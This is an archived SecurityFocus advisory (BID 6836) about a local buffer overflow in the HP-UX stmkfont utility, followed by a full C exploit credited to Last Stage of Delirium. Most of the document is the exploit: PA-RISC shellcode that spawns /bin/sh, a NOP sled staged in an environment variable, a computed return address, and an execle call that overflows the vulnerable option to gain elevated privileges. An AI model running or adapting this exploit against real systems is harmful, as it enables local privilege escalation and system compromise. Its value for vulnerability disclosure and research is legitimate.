// source: https://www.securityfocus.com/bid/6836/info

A buffer overflow vulnerability has been reported in the stmkfont utility shipped with HP-UX systems. The problem occurs due to insufficient bounds checking on user-suplied data to the alternate typeface library command-line option.

A local attacker may be able to exploit this issue to execute arbitrary code with elevated privileges.

All Avaya PDS 9 and 11 platforms are vulnerable to this issue. Avaya PDS 12 platforms running on HP-UX 11.00 are vulnerable as well. PDS 12 versions running on HP-UX 11.11 are not vulnerable. 

/*## copyright LAST STAGE OF DELIRIUM jun 2002 poland        *://lsd-pl.net/ #*/
/*## /usr/bin/stmkfont                                                       #*/

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

#define ADRNUM 1200
#define NOPNUM 12000 
#define PADNUM 3

char shellcode[]=
    "\xeb\x5f\x1f\xfd"    /* bl     .+8,%r26               */
    "\x0b\x39\x02\x99"    /* xor    %r25,%r25,%r25         */
    "\xb7\x5a\x40\x22"    /* addi,< 0x11,%r26,%r26         */
    "\x0f\x40\x12\x0e"    /* stbs   %r0,7(%r26)            */
    "\x20\x20\x08\x01"    /* ldil   L%0xc0000004,%r1       */
    "\xe4\x20\xe0\x08"    /* ble    R%0xc0000004(%sr7,%r1) */
    "\xb4\x16\x70\x16"    /* addi,> 0xb,%r0,%r22           */
    "/bin/sh"
;

char jump[]=
    "\xe0\x40\x00\x00"    /* be     0x0(%sr0,%rp)          */
    "\x37\xdc\x00\x00"    /* copy   %sp,%ret0              */
;

char nop[]="\x0a\xb5\x02\x95";

int main(int argc,char **argv){
    char buffer[20000],adr[4],*b,*envp[2];  
    int i; 

    printf("copyright LAST STAGE OF DELIRIUM jun 2002 poland  //lsd-pl.net/\n");
    printf("/usr/bin/stmkfont for HP-UX 10.20 700/800\n");    

    *((unsigned long*)adr)=(*(unsigned long(*)())jump)()-16732;
    printf("0x%x\n",*((unsigned long*)adr));

    envp[0]=&buffer[2000];
    envp[1]=0;

    b=buffer;
    for(i=0;i<PADNUM;i++) *b++=0x61;
    for(i=0;i<ADRNUM;i++)  *b++=adr[i%4];
    *b=0;

    b=&buffer[2000];
    strcpy(b,"lsd=");b+=4;
    for(i=0;i<NOPNUM;i++) *b++=nop[i%4];
    for(i=0;i<strlen(shellcode);i++) *b++=shellcode[i];
    *b=0;

    execle("/usr/bin/stmkfont","lsd",buffer,0,envp);
}